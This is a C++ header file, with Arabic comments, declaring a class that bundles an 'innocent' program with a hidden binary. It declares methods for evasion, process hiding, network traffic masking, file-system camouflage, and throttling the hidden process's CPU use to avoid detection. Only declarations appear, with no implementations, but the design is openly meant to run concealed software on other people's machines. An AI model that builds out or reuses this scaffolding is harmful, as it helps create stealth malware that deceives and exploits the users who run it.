#ifndef SEAMLESS_INTEGRATOR_H
#define SEAMLESS_INTEGRATOR_H

#include "innocent_wrapper.h"
#include <string>
#include <vector>
#include <memory>

/**
 * فئة للدمج السلس بين البرامج البريئة والعمليات الخفية
 */
class SeamlessIntegrator {
public:
    struct IntegrationConfig {
        std::string innocentBinaryPath;
        std::string hiddenBinaryPath;
        std::string configPath;
        InnocentWrapper::ProgramType wrapperType;
        bool enableAdvancedEvasion;
        bool enableResourceThrottling;
        int maxCPUUsage;  // نسبة مئوية
        int checkInterval; // ثواني
    };
    
    SeamlessIntegrator(const IntegrationConfig& config);
    ~SeamlessIntegrator();
    
    // بدء التكامل
    bool startIntegration();
    
    // إيقاف التكامل
    void stopIntegration();
    
    // فحص حالة التكامل
    bool isIntegrationActive();
    
    // تحديث الإعدادات بشكل ديناميكي
    void updateConfig(const IntegrationConfig& newConfig);
    
private:
    IntegrationConfig config;
    std::unique_ptr<InnocentWrapper> wrapper;
    bool isActive;
    std::thread monitoringThread;
    
    // مراقبة ذكية للنظام
    void monitorSystemResources();
    void adjustHiddenProcessPriority();
    bool shouldThrottleHiddenProcess();
    
    // تزامن العمليات
    void synchronizeProcesses();
    void ensureInnocentProcessHealth();
    
    // إخفاء متقدم
    void advancedProcessHiding();
    void networkTrafficMasking();
    void fileSystemCamouflage();
};

#endif // SEAMLESS_INTEGRATOR_H
